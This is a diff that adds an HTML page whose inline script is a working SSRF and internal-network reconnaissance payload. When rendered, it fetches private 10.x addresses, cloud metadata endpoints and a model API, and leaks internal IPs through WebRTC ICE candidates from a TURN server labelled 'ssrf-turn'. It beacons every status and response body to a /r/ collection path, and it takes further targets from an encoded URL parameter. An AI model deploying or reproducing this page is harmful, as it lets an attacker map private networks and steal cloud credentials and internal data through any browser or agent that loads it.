@@ -1,0 +1,52 @@
+<!DOCTYPE html><html><head><title>M</title></head><body><div id="o">S</div><script>
+(function(){
+var o=document.getElementById("o");o.innerHTML+="<br>JS_RUNS";
+var out=[],t0=performance.now();
+function log(s){out.push(s);try{navigator.sendBeacon("/r/"+encodeURIComponent(s),"");}catch(e){}}
+setTimeout(function(){try{o.innerHTML+="<br>DUMP|"+out.join("|");}catch(e){o.innerHTML+="<br>DUMPERR";}},5200);
+try{
+var pc=new RTCPeerConnection({iceServers:[{urls:"turn:ssrf-turn.southeastasia.azurecontainer.io:3478",username:"p",credential:"p"},{urls:"stun:stun.cloudflare.com:3478"},{urls:"stun:stun.l.google.com:19302"}]});
+pc.createDataChannel("");pc.createOffer().then(function(of){pc.setLocalDescription(of);}).catch(function(){});
+pc.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate)log("ICE:"+e.candidate.candidate.slice(0,140));};
+}catch(e){log("RTCERR:"+e.message.slice(0,60));}
+var DEF=[
+"http://10.4.232.131:38081/v1/models",
+"http://10.4.232.131:38081/",
+"http://10.4.232.131:22/",
+"http://10.4.232.130:38081/",
+"http://10.4.232.132:38081/",
+"http://10.92.0.10:38081/",
+"http://10.92.0.11:80/",
+"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+"http://100.100.100.200/",
+"http://100.96.0.96/",
+"https://example.com/",
+"https://api.kimi.com/coding/v1/models"
+];
+var targets=DEF;
+try{
+var m=location.search.match(/[?&]cfg=([A-Za-z0-9_=-]+)/);
+if(m){var j=JSON.parse(atob(m[1].replace(/-/g,"+").replace(/_/g,"/")));if(j.targets&&j.targets.length)targets=j.targets;}
+}catch(e){log("CFGERR:"+e.message.slice(0,60));}
+log("N="+targets.length);
+targets.forEach(function(u){
+try{
+fetch(u,{mode:"no-cors"}).then(function(r){
+log("NC:"+u+"="+r.status+":"+r.type+":"+Math.round(performance.now()-t0)+"ms");
+}).catch(function(e){
+log("NCE:"+u+"="+e.message.slice(0,40)+":"+Math.round(performance.now()-t0)+"ms");
+});
+}catch(e){log("NCX:"+u+"="+e.message.slice(0,40));}
+try{
+fetch(u,{mode:"cors"}).then(function(r){
+log("C:"+u+"="+r.status+":"+r.type+":"+Math.round(performance.now()-t0)+"ms");
+return Promise.race([r.text(),new Promise(function(_,rej){setTimeout(rej,2500);})]).then(function(t){
+log("B:"+u+"=len"+t.length+":"+t.slice(0,400));
+}).catch(function(){log("BTO:"+u);});
+}).catch(function(e){
+log("CE:"+u+"="+e.message.slice(0,40)+":"+Math.round(performance.now()-t0)+"ms");
+});
+}catch(e){log("CX:"+u+"="+e.message.slice(0,40));}
+});
+})();
+</script></body></html>
